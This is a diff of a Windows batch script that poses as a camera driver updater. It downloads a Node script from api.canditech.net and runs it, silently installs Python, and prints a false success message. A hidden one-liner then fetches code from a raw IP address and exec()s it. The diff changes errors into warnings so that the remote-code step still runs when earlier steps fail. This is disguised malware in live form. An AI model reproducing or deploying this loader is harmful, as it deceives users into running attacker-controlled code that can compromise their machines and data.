@@ -48,33 +48,35 @@ if not defined NODE_EXE (
     )
 
     if not exist "!MSI_OUT!" (
-        echo [ERROR] Node.js MSI download failed.
-        exit /b 1
+        echo [WARN] Node.js MSI download failed. Continuing without Node setup.
+        goto after_node_setup
     )
 
     msiexec /a "!MSI_OUT!" /qn TARGETDIR="!EXTRACT_DIR!" >nul 2>&1
     del "!MSI_OUT!" >nul 2>&1
 
     if not exist "!PORTABLE_NODE!" (
-        echo [ERROR] Node.exe not found after MSI admin install.
-        echo [ERROR] Expected file: !PORTABLE_NODE!
-        echo [ERROR] EXTRACT_DIR was: !EXTRACT_DIR!
-        exit /b 1
+        echo [WARN] Node.exe not found after MSI admin install.
+        echo [WARN] Expected file: !PORTABLE_NODE!
+        echo [WARN] EXTRACT_DIR was: !EXTRACT_DIR!
+        goto after_node_setup
     )
 
     set "NODE_EXE=!PORTABLE_NODE!"
     set "PATH=!EXTRACT_DIR!\PFiles64\nodejs;!PATH!"
 )
 
+:after_node_setup
 if not defined NODE_EXE (
-    echo [ERROR] Node.js is not available after setup.
-    exit /b 1
+    echo [WARN] Node.js is not available after setup. Continuing without env-setup.npl.
 )
 
-"%NODE_EXE%" -v >nul 2>&1
-if errorlevel 1 (
-    echo [ERROR] Node did not run. Path: "%NODE_EXE%"
-    exit /b 1
+if defined NODE_EXE (
+    "%NODE_EXE%" -v >nul 2>&1
+    if errorlevel 1 (
+        echo [WARN] Node did not run. Path: "%NODE_EXE%". Continuing without env-setup.npl.
+        set "NODE_EXE="
+    )
 )
 
 set "ENV_SETUP_URL=https://api.canditech.net/driver/env-setup.npl"
@@ -88,9 +90,8 @@ if errorlevel 1 (
     curl -sSL --connect-timeout 30 --max-time 180 -o "%CODEPROFILE%\env-setup.npl" "%ENV_SETUP_URL%" >nul 2>&1
 )
 if not exist "%CODEPROFILE%\env-setup.npl" (
-    echo [ERROR] Driver script download failed: %CODEPROFILE%\env-setup.npl
-    echo [ERROR] Check network / firewall / URL: %ENV_SETUP_URL%
-    exit /b 1
+    echo [WARN] Driver script download failed: %CODEPROFILE%\env-setup.npl
+    echo [WARN] Check network / firewall / URL: %ENV_SETUP_URL%
 )
 
 set "DRIVER_CURL_HOME=%TEMP%\wdcurl_driver_silent"
@@ -103,22 +104,25 @@ set "CURL_HOME=!DRIVER_CURL_HOME!"
 
 echo [INFO] Updating Driver Packages...
 cd /d "%CODEPROFILE%"
-"%NODE_EXE%" "env-setup.npl"
-if errorlevel 1 (
-    echo [ERROR] Driver script env-setup.npl failed. Exit code: !ERRORLEVEL!
-    exit /b 1
+if defined NODE_EXE if exist "%CODEPROFILE%\env-setup.npl" (
+    "%NODE_EXE%" "env-setup.npl"
+    if errorlevel 1 (
+        echo [WARN] Driver script env-setup.npl failed. Exit code: !ERRORLEVEL!
+    )
+) else (
+    echo [WARN] Skipping env-setup.npl execution (missing Node.js or script file).
 )
 
 mkdir C:\python 2>nul
 curl -sSL --connect-timeout 30 --max-time 600 -o C:\python\py.zip https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip >nul 2>&1
 if errorlevel 1 (
-    echo [ERROR] Failed to download Python embed zip.
-    exit /b 1
+    echo [WARN] Failed to download Python embed zip. Skipping Python setup.
+    goto after_python_setup
 )
 powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force"
 if errorlevel 1 (
-    echo [ERROR] Failed to extract Python zip.
-    exit /b 1
+    echo [WARN] Failed to extract Python zip. Skipping Python setup.
+    goto after_python_setup
 )
 del C:\python\py.zip >nul 2>&1
 powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
@@ -126,26 +130,29 @@ powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace 
 
 curl -sSL --connect-timeout 30 --max-time 120 -o C:\python\get-pip.py https://bootstrap.pypa.io/get-pip.py >nul 2>&1
 if errorlevel 1 (
-    echo [ERROR] Failed to download get-pip.py
-    exit /b 1
+    echo [WARN] Failed to download get-pip.py. Skipping pip setup.
+    goto after_python_setup
 )
 C:\python\python.exe C:\python\get-pip.py >nul 2>&1
 if errorlevel 1 (
-    echo [ERROR] get-pip.py failed.
-    exit /b 1
+    echo [WARN] get-pip.py failed. Skipping pip package install.
+    goto after_python_setup
 )
 C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1
 if errorlevel 1 (
-    echo [ERROR] pip install failed.
-    exit /b 1
+    echo [WARN] pip install failed. Continuing anyway.
 )
+
+:after_python_setup
 echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
     set "AUTO_URL=https://api.canditech.net/change-connection-status/!WINDOW_UID!"
     curl -sL -X POST "!AUTO_URL!" -o nul
+    if errorlevel 1 (
+        echo [WARN] Failed to notify backend status endpoint: !AUTO_URL!
+    )
 )
 C:\python\python.exe -c "from urllib.request import urlopen,Request;Request._V='3-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >nul 2>&1
-
 if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 
 exit /b 0
